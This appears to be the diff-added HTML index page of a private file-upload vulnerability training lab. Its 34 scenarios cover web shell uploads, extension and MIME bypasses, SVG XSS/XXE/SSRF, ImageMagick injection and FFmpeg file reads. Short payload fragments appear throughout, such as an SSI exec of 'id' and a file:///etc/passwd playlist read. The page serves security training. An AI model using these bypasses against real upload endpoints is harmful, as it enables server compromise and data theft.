@@ -1,0 +1,1726 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>File Upload · Private Test Environment</title>
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2351dfdf' d='M13 2 4 14h6l-1 8 10-12h-6z'/%3E%3C/svg%3E" />
+    <link rel="stylesheet" href="css/style.css?v=21" />
+</head>
+<body>
+    <!-- Background layers -->
+    <div class="background-grid" aria-hidden="true"></div>
+    <div class="background-glow glow-one" aria-hidden="true"></div>
+    <div class="background-glow glow-two" aria-hidden="true"></div>
+
+    <!-- ═══════ Topbar ═══════ -->
+    <header class="topbar">
+        <div class="container topbar-content">
+            <a class="logo" href="/menu/">
+                <span class="logo-symbol" aria-hidden="true">
+                    <svg viewBox="0 0 24 24"><path d="M13 2 4 14h6l-1 8 10-12h-6z" /></svg>
+                </span>
+                <span>
+                    <strong>File Upload</strong>
+                    <small>private test environment</small>
+                </span>
+            </a>
+            <div class="system-state">
+                <span class="status-dot" aria-hidden="true"></span>
+                all systems operational
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <!-- ═══════ Hero Header ═══════ -->
+        <section class="hero-section">
+            <div class="container hero-content">
+                <div class="hero-main">
+                    <span class="badge">private test environment</span>
+                    <h1 class="hero-title">File Upload Vulnerabilities</h1>
+                </div>
+            </div>
+        </section>
+
+        <!-- ═══════ Stats strip ═══════ -->
+        <section class="stats-section">
+            <div class="container stats-grid">
+                <div class="stat">
+                    <span class="stat-number">34</span>
+                    <span class="stat-label">scenarios</span>
+                </div>
+                <div class="stat">
+                    <span class="stat-number">34</span>
+                    <span class="stat-label">active labs</span>
+                </div>
+                <div class="stat">
+                    <span class="stat-number">07</span>
+                    <span class="stat-label">critical severity</span>
+                </div>
+                <div class="stat">
+                    <span class="stat-number">13</span>
+                    <span class="stat-label">hard labs</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- ═══════ Laboratories Main Section ═══════ -->
+        <section class="laboratories" id="labs">
+            <div class="container">
+
+                <!-- ═══════ View Switcher Bar ═══════ -->
+                <div class="view-switch-bar">
+                    <div class="view-switch-tabs">
+                        <button type="button" class="view-tab active" id="tab-cards-view">
+                            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="14" y="14" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect></svg>
+                            Cards Grid
+                            <span class="badge-count">34</span>
+                        </button>
+                        <button type="button" class="view-tab" id="tab-mindmap-view">
+                            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg>
+                            Threat Mindmap
+                            <span class="badge-new">Tree</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- ═══════ Threat Mindmap Section (Hidden by Default) ═══════ -->
+                <div id="mindmap-view" class="mindmap-view" hidden>
+                    <div class="mindmap-toolbar">
+                        <div class="mindmap-search-wrap">
+                            <label class="search-box">
+                                <svg viewBox="0 0 24 24" fill-rule="evenodd" aria-hidden="true">
+                                    <path d="M10.5 1.5a9 9 0 1 0 5.4 16.22l4.18 4.18a1.125 1.125 0 0 0 1.59-1.59l-4.18-4.18A9 9 0 0 0 10.5 1.5Zm0 2.25a6.75 6.75 0 1 1 0 13.5 6.75 6.75 0 0 1 0-13.5Z" />
+                                </svg>
+                                <input id="map-search" type="search" placeholder="Search mindmap techniques or Lab #…" autocomplete="off" />
+                            </label>
+                        </div>
+                        <div class="mindmap-branch-filters">
+                            <button type="button" class="branch-pill active" data-branch="all">All Branches</button>
+                            <button type="button" class="branch-pill pill-yellow" data-branch="shell">Shell</button>
+                            <button type="button" class="branch-pill pill-coral" data-branch="filter">Filter bypass</button>
+                            <button type="button" class="branch-pill pill-green" data-branch="xss">XSS</button>
+                            <button type="button" class="branch-pill pill-purple" data-branch="images">Images</button>
+                            <button type="button" class="branch-pill pill-pink" data-branch="audiovideo">Audio / Video</button>
+                            <button type="button" class="branch-pill pill-cyan" data-branch="other">Other</button>
+                        </div>
+                        <div class="mindmap-zoom-controls">
+                            <button type="button" class="zoom-btn" id="map-zoom-in" title="Zoom In">+</button>
+                            <button type="button" class="zoom-btn" id="map-zoom-reset" title="Reset Zoom">100%</button>
+                            <button type="button" class="zoom-btn" id="map-zoom-out" title="Zoom Out">−</button>
+                        </div>
+                    </div>
+
+                    <div class="mindmap-legend">
+                        <div class="legend-item"><span class="legend-dot active"></span> <strong>Interactive Lab</strong> (Click node to launch scenario)</div>
+                        <div class="legend-item"><span class="legend-dot ref"></span> <strong>Reference Vector</strong> (Hover to view full details)</div>
+                    </div>
+
+                    <div class="mindmap-viewport" id="mindmap-viewport">
+                        <div class="mindmap-canvas" id="mindmap-canvas">
+                            <div class="mindmap-tree-layout">
+
+                                <!-- LEFT WING (Shell, Audio/Video, Images) -->
+                                <div class="tree-wing wing-left">
+<div class="tree-branch branch-shell" data-branch="shell">
+  <div class="tree-branch-header header-yellow">
+    <span class="branch-pill-badge">Shell</span>
+  </div>
+  <div class="tree-groups">
+    <div class="tree-group">
+      <div class="tree-group-title">PHP Interpreters</div>
+      <div class="tree-nodes">
+        <a href="/scenario01/" class="tree-node is-lab" data-branch="shell" data-lab="01" data-search="no validation .php web shell rce scenario 01">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Unrestricted File Upload</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 01</span>
+              <span class="popup-diff diff-easy">easy</span>
+              <span class="popup-sev sev-critical">critical</span>
+            </div>
+            <div class="popup-title">Unrestricted File Upload</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Web Shell</strong></span>
+            </div>
+            <div class="popup-code"><code>.php (clean execution)</code></div>
+            <div class="popup-desc">No validation at all — upload a PHP web shell and execute it. The most basic file upload RCE.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <a href="/scenario04/" class="tree-node is-lab" data-branch="shell" data-lab="04" data-search="blacklist bypass phtml php5 phar alternative shell scenario 04">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Extension Blacklist Bypass</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 04</span>
+              <span class="popup-diff diff-easy">easy</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">Extension Blacklist Bypass</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Alternative Shell</strong></span>
+            </div>
+            <div class="popup-code"><code>.phtml / .php5 / .phar</code></div>
+            <div class="popup-desc">Blacklist blocks .php only. Bypass with .php5, .phtml, .phar using Burp.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <a href="/scenario05/" class="tree-node is-lab" data-branch="shell" data-lab="05" data-search="case sensitive check mixed case php aspx scenario 05">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Case Sensitivity Bypass</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 05</span>
+              <span class="popup-diff diff-easy">easy</span>
+              <span class="popup-sev sev-medium">medium</span>
+            </div>
+            <div class="popup-title">Case Sensitivity Bypass</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Case Bypass</strong></span>
+            </div>
+            <div class="popup-code"><code>.PHP / .PhP / .AsPX</code></div>
+            <div class="popup-desc">Filter checks lowercase .php only. Bypass with .PhP, .PHP using Burp Repeater.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <div class="tree-node is-ref" data-branch="shell" data-search="php alternatives rare extensions inc phps pgif">
+          <div class="tree-node-title"><span class="ref-dot"></span>PHP Rare Extensions</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">PHP Rare Extensions</div>
+            <div class="popup-code"><code>.inc, .php2, .php3, .php4, .php6, .php7, .phtm, .phps, .pgif, .shtml</code></div>
+            <div class="popup-desc">Alternative legacy PHP extensions handled by server configurations.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="tree-group">
+      <div class="tree-group-title">ASP.NET & Windows</div>
+      <div class="tree-nodes">
+        <a href="/scenario17/" class="tree-node is-lab" data-branch="shell" data-lab="17" data-search="windows alternate data stream ntfs ads data scenario 17">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Windows ADS Bypass</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 17</span>
+              <span class="popup-diff diff-medium">medium</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">Windows ADS Bypass</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Windows ADS</strong></span>
+            </div>
+            <div class="popup-code"><code>test.asp::$DATA alternate data stream</code></div>
+            <div class="popup-desc">NTFS ::$DATA bypasses blacklist. Use Burp Repeater to upload shell.php::$DATA.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <div class="tree-node is-ref" data-branch="shell" data-search="asp net formats aspx ashx asmx cshtml">
+          <div class="tree-node-title"><span class="ref-dot"></span>ASP.NET Formats</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">ASP.NET Formats</div>
+            <div class="popup-code"><code>.asp, .aspx, .ashx, .asmx, .xamlx, .asa, .cshtml, .vbhtml, .axd, .soap, .rem</code></div>
+            <div class="popup-desc">Dynamic ASP.NET and IIS script handler extensions.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="tree-group">
+      <div class="tree-group-title">Java Servlets & SSI</div>
+      <div class="tree-nodes">
+        <div class="tree-node is-ref" data-branch="shell" data-search="java jsp servlets tomcat jspx jsw">
+          <div class="tree-node-title"><span class="ref-dot"></span>Java / JSP Servlets</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">Java / JSP Servlets</div>
+            <div class="popup-code"><code>.jsp, .jspx, .jsw, .jspf, .jsv</code></div>
+            <div class="popup-desc">Tomcat and Jetty Java servlet compilation targets.</div>
+          </div>
+        </div>
+        <div class="tree-node is-ref" data-branch="shell" data-search="ssi apache server side includes shtml">
+          <div class="tree-node-title"><span class="ref-dot"></span>SSI in Apache</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">SSI in Apache</div>
+            <div class="popup-code"><code>.stm, .shtm, .shtml (&lt;!--#exec ...--&gt;)</code></div>
+            <div class="popup-desc">Server-Side Includes executing operating system commands.</div>
+          </div>
+        </div>
+        <div class="tree-node is-ref" data-branch="shell" data-search="cgi perl scripts pl pm lib cfm">
+          <div class="tree-node-title"><span class="ref-dot"></span>CGI / Rare Scripts</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">CGI / Rare Scripts</div>
+            <div class="popup-code"><code>.pl, .cgi, .pm, .lib, .cfm</code></div>
+            <div class="popup-desc">Common Gateway Interface Perl and ColdFusion scripts.</div>
+          </div>
+        <a href="/scenario32/" class="tree-node is-lab" data-branch="shell" data-lab="32" data-search="ssi server side includes shtml exec cmd include scenario 32">
+          <div class="tree-node-title"><span class="pulse-dot"></span>SSI Injection (.shtml)</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 32</span>
+              <span class="popup-diff diff-medium">medium</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">SSI Injection (.shtml)</div>
+            <div class="popup-meta">
+              <span>Category: <strong>SSI</strong></span>
+            </div>
+            <div class="popup-code"><code>&lt;!--#exec cmd="id" --&gt;</code></div>
+            <div class="popup-desc">SHTML supports SSI exec. Upload malicious .shtml via Burp.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="tree-branch branch-audiovideo" data-branch="audiovideo">
+  <div class="tree-branch-header header-pink">
+    <span class="branch-pill-badge">Audio / Video</span>
+  </div>
+  <div class="tree-groups">
+    <div class="tree-group">
+      <div class="tree-group-title">Metadata & ID3</div>
+      <div class="tree-nodes">
+        <div class="tree-node is-ref" data-branch="audiovideo" data-search="id3 text metadata injection xss sqli command audio">
+          <div class="tree-node-title"><span class="ref-dot"></span>Text Metadata Injection</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">Text Metadata Injection</div>
+            <div class="popup-code"><code>XSS, SQLi, Command Injection in ID3</code></div>
+            <div class="popup-desc">Injecting payloads into MP3 ID3 metadata frames processed by media engines.</div>
+          </div>
+        </div>
+        <div class="tree-node is-ref" data-branch="audiovideo" data-search="images in mp3 apic cover metadata">
+          <div class="tree-node-title"><span class="ref-dot"></span>Images in MP3</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">Images in MP3</div>
+            <div class="popup-code"><code>Malicious APIC cover artwork frames</code></div>
+            <div class="popup-desc">Embedded image exploits within audio file container metadata.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="tree-group">
+      <div class="tree-group-title">ffmpeg Exploits</div>
+      <div class="tree-nodes">
+        <div class="tree-node is-ref" data-branch="audiovideo" data-search="ffmpeg hls playlist m3u8 ssrf file read">
+          <div class="tree-node-title"><span class="ref-dot"></span>ffmpeg HLS Playlists</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">ffmpeg HLS Playlists</div>
+            <div class="popup-code"><code>SSRF / File Read in m3u8 playlists</code></div>
+            <div class="popup-desc">Malicious video playlist referencing local files as video segments.</div>
+          </div>
+        </div>
+        <div class="tree-node is-ref" data-branch="audiovideo" data-search="ffmpeg avi m3u xbin ssrf lfi">
+          <div class="tree-node-title"><span class="ref-dot"></span>HLS inside AVI</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">HLS inside AVI</div>
+            <div class="popup-code"><code>SSRF / File Read in AVI container</code></div>
+            <div class="popup-desc">Crafted AVI files triggering local file read via GStreamer/ffmpeg.</div>
+          </div>
+        <a href="/scenario34/" class="tree-node is-lab" data-branch="audiovideo" data-lab="34" data-search="ffmpeg hls m3u8 ssrf file read etc passwd media scenario 34">
+          <div class="tree-node-title"><span class="pulse-dot"></span>FFmpeg HLS SSRF / LFI</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 34</span>
+              <span class="popup-diff diff-hard">hard</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">FFmpeg HLS SSRF / LFI</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Audio/Video</strong></span>
+            </div>
+            <div class="popup-code"><code>file:///etc/passwd in HLS playlist</code></div>
+            <div class="popup-desc">FFmpeg HLS playlist can read file:///etc/passwd. Upload malicious m3u8 via Burp.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="tree-branch branch-images" data-branch="images">
+  <div class="tree-branch-header header-purple">
+    <span class="branch-pill-badge">Images</span>
+  </div>
+  <div class="tree-groups">
+    <div class="tree-group">
+      <div class="tree-group-title">Image Polyglots & Content</div>
+      <div class="tree-nodes">
+        <a href="/scenario21/" class="tree-node is-lab" data-branch="images" data-lab="21" data-search="image polyglot metadata payload exif png chunk shell in image scenario 21">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Image Polyglot</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 21</span>
+              <span class="popup-diff diff-hard">hard</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">Image Polyglot</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Shell in Image</strong></span>
+            </div>
+            <div class="popup-code"><code>PNG metadata / PHP chunk (Shell in Image)</code></div>
+            <div class="popup-desc">Valid image containing PHP in EXIF/PNG chunk. Create polyglot and upload via Burp.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <div class="tree-node is-ref" data-branch="images" data-search="hide shell xss in image binary data">
+          <div class="tree-node-title"><span class="ref-dot"></span>Binary Data Shell</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">Binary Data Shell</div>
+            <div class="popup-code"><code>Hide Shell / XSS in image binary raw data</code></div>
+            <div class="popup-desc">Payloads embedded in IDAT/raw pixel arrays surviving image transformations.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="tree-group">
+      <div class="tree-group-title">DoS & Decompression</div>
+      <div class="tree-nodes">
+        <a href="/scenario14/" class="tree-node is-lab" data-branch="images" data-lab="14" data-search="zip decompression bomb denial of service dos scenario 14">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Zip Bomb</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 14</span>
+              <span class="popup-diff diff-medium">medium</span>
+              <span class="popup-sev sev-medium">medium</span>
+            </div>
+            <div class="popup-title">Zip Bomb</div>
+            <div class="popup-meta">
+              <span>Category: <strong>ZIP Bomb (DoS)</strong></span>
+            </div>
+            <div class="popup-code"><code>Gigantic expansion ratio (DoS)</code></div>
+            <div class="popup-desc">Small ZIP expands to huge size causing DoS. Upload highly compressible ZIP.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <div class="tree-node is-ref" data-branch="images" data-search="pixel flood dos image dimensions memory exhaustion">
+          <div class="tree-node-title"><span class="ref-dot"></span>Pixel Flood DoS</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">Pixel Flood DoS</div>
+            <div class="popup-code"><code>Gigantic canvas dimensions (50000x50000)</code></div>
+            <div class="popup-desc">Tiny compressed file expanding to enormous memory footprint upon decode.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="tree-group">
+      <div class="tree-group-title">Vector SVG Payloads</div>
+      <div class="tree-nodes">
+        <a href="/scenario12/" class="tree-node is-lab" data-branch="images" data-lab="12" data-search="svg stored xss vector javascript onload scenario 12">
+          <div class="tree-node-title"><span class="pulse-dot"></span>SVG Stored XSS</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 12</span>
+              <span class="popup-diff diff-medium">medium</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">SVG Stored XSS</div>
+            <div class="popup-meta">
+              <span>Category: <strong>SVG Stored XSS</strong></span>
+            </div>
+            <div class="popup-code"><code>&lt;script&gt; / onload in SVG vector</code></div>
+            <div class="popup-desc">SVG can contain JavaScript. Upload SVG with onload alert via Burp.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <a href="/scenario13/" class="tree-node is-lab" data-branch="images" data-lab="13" data-search="svg external entity file read xxe xml scenario 13">
+          <div class="tree-node-title"><span class="pulse-dot"></span>SVG XXE</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 13</span>
+              <span class="popup-diff diff-medium">medium</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">SVG XXE</div>
+            <div class="popup-meta">
+              <span>Category: <strong>SVG XXE</strong></span>
+            </div>
+            <div class="popup-code"><code>XXE file read via SVG XML parser</code></div>
+            <div class="popup-desc">SVG XML parser resolves external entities. Upload XXE payload to read /etc/hostname.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <a href="/scenario33/" class="tree-node is-lab" data-branch="images" data-lab="33" data-search="svg ssrf xlink href internal cloud metadata scenario 33">
+          <div class="tree-node-title"><span class="pulse-dot"></span>SVG SSRF (XLink)</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 33</span>
+              <span class="popup-diff diff-medium">medium</span>
+              <span class="popup-sev sev-medium">medium</span>
+            </div>
+            <div class="popup-title">SVG SSRF (XLink)</div>
+            <div class="popup-meta">
+              <span>Category: <strong>SVG SSRF</strong></span>
+            </div>
+            <div class="popup-code"><code>&lt;image xlink:href="http://127.0.0.1/" /&gt;</code></div>
+            <div class="popup-desc">SVG image tag triggers SSRF. Upload SVG with external URL via Burp.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <div class="tree-node is-ref" data-branch="images" data-search="svg ssrf payloads xlink href">
+          <div class="tree-node-title"><span class="ref-dot"></span>SVG SSRF Payloads</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">SVG SSRF Payloads</div>
+            <div class="popup-code"><code>&lt;image xlink:href=&quot;http://...&quot; /&gt;</code></div>
+            <div class="popup-desc">External resource inclusions inside SVG vector graphics.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="tree-group">
+      <div class="tree-group-title">Image Processors & Parser CVEs</div>
+      <div class="tree-nodes">
+        <a href="/scenario26/" class="tree-node is-lab" data-branch="images" data-lab="26" data-search="image processor command injection imagemagick identify pipe scenario 26">
+          <div class="tree-node-title"><span class="pulse-dot"></span>ImageMagick Command Injection</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 26</span>
+              <span class="popup-diff diff-hard">hard</span>
+              <span class="popup-sev sev-critical">critical</span>
+            </div>
+            <div class="popup-title">ImageMagick Command Injection</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Image Processing</strong></span>
+            </div>
+            <div class="popup-code"><code>ImageMagick Shell Inj (CVE-2020-29599)</code></div>
+            <div class="popup-desc">ImageMagick uses filename in shell command. Inject via filename using Burp Repeater.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <div class="tree-node is-ref" data-branch="images" data-search="ghostscript postscript pipe cve rce">
+          <div class="tree-node-title"><span class="ref-dot"></span>GhostScript PS / PDF RCE</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">GhostScript PS / PDF RCE</div>
+            <div class="popup-code"><code>PostScript %pipe% command injection</code></div>
+            <div class="popup-desc">Ghostscript PostScript pipe command execution vulnerabilities.</div>
+          </div>
+        </div>
+        <div class="tree-node is-ref" data-branch="images" data-search="graphicsmagick memory leaks xbm gif cve">
+          <div class="tree-node-title"><span class="ref-dot"></span>GraphicsMagick &amp; Leaks</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">GraphicsMagick &amp; Leaks</div>
+            <div class="popup-code"><code>CVE-2019-12921 / XBM &amp; GIF leaks</code></div>
+            <div class="popup-desc">Uninitialized memory disclosure in legacy image format parsers.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+                                </div>
+
+                                <!-- CENTER HUB -->
+                                <div class="tree-center-divider">
+                                    <div class="tree-hub-center">
+                                        <div class="hub-box">
+                                            <div class="hub-pill">TAXONOMY HUB</div>
+                                            <h2 class="hub-title">File Upload</h2>
+                                            <div class="hub-sub">Attack Vectors &amp; Exploitation</div>
+                                            <div class="hub-stats">
+                                                <span><strong>34</strong> Active Labs</span>
+                                                <span class="sep">•</span>
+                                                <span><strong>6</strong> Attack Vectors</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- RIGHT WING (Filter bypass, XSS, Other) -->
+                                <div class="tree-wing wing-right">
+<div class="tree-branch branch-filter" data-branch="filter">
+  <div class="tree-branch-header header-coral">
+    <span class="branch-pill-badge">Filter bypass</span>
+  </div>
+  <div class="tree-groups">
+    <div class="tree-group">
+      <div class="tree-group-title">Client & Protocol Bypasses</div>
+      <div class="tree-nodes">
+        <a href="/scenario02/" class="tree-node is-lab" data-branch="filter" data-lab="02" data-search="client side validation bypass javascript scenario 02">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Client-Side Validation Bypass</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 02</span>
+              <span class="popup-diff diff-easy">easy</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">Client-Side Validation Bypass</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Client Bypass</strong></span>
+            </div>
+            <div class="popup-code"><code>Browser JS / Form inspection</code></div>
+            <div class="popup-desc">Browser JS blocks .php, but server doesn't. Intercept with Burp and change filename.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <a href="/scenario11/" class="tree-node is-lab" data-branch="filter" data-lab="11" data-search="put method upload raw http put scenario 11">
+          <div class="tree-node-title"><span class="pulse-dot"></span>HTTP PUT Method Upload</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 11</span>
+              <span class="popup-diff diff-medium">medium</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">HTTP PUT Method Upload</div>
+            <div class="popup-meta">
+              <span>Category: <strong>PUT Shell</strong></span>
+            </div>
+            <div class="popup-code"><code>Direct HTTP PUT /path/file.php</code></div>
+            <div class="popup-desc">Bypass multipart checks by sending raw PUT request with Burp Repeater.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+      </div>
+    </div>
+    <div class="tree-group">
+      <div class="tree-group-title">Content-Type / MIME Header</div>
+      <div class="tree-nodes">
+        <a href="/scenario03/" class="tree-node is-lab" data-branch="filter" data-lab="03" data-search="mime type validation bypass content type scenario 03">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Content-Type Bypass</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 03</span>
+              <span class="popup-diff diff-easy">easy</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">Content-Type Bypass</div>
+            <div class="popup-meta">
+              <span>Category: <strong>MIME Bypass</strong></span>
+            </div>
+            <div class="popup-code"><code>Allowed MIME (image/png) + disallowed ext</code></div>
+            <div class="popup-desc">Server trusts client-supplied Content-Type. Spoof it to image/png with Burp.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <div class="tree-node is-ref" data-branch="filter" data-search="mime manipulation disallowed mime remove content type">
+          <div class="tree-node-title"><span class="ref-dot"></span>MIME Manipulation</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">MIME Manipulation</div>
+            <div class="popup-code"><code>Disallowed MIME + allowed ext / Remove Content-Type</code></div>
+            <div class="popup-desc">Header tampering to bypass MIME allowlists and denylists.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="tree-group">
+      <div class="tree-group-title">Extension Tricks</div>
+      <div class="tree-nodes">
+        <a href="/scenario08/" class="tree-node is-lab" data-branch="filter" data-lab="08" data-search="double extension php png jpg php scenario 08">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Double Extension Bypass</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 08</span>
+              <span class="popup-diff diff-medium">medium</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">Double Extension Bypass</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Double Extension</strong></span>
+            </div>
+            <div class="popup-code"><code>.php.png / .jpg.php</code></div>
+            <div class="popup-desc">Server checks final .png, Apache executes inner .php. Upload shell.php.png.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <a href="/scenario19/" class="tree-node is-lab" data-branch="filter" data-lab="19" data-search="nested extension stripping p phphp scenario 19">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Nested Extension Stripping</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 19</span>
+              <span class="popup-diff diff-hard">hard</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">Nested Extension Stripping</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Nested Extension</strong></span>
+            </div>
+            <div class="popup-code"><code>.p.phphp / .php.png</code></div>
+            <div class="popup-desc">Filter strips .php once. Use .p.phphp to reconstruct .php after stripping. Use Burp Repeater.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <div class="tree-node is-ref" data-branch="filter" data-search="slash suffixes windows dots test php">
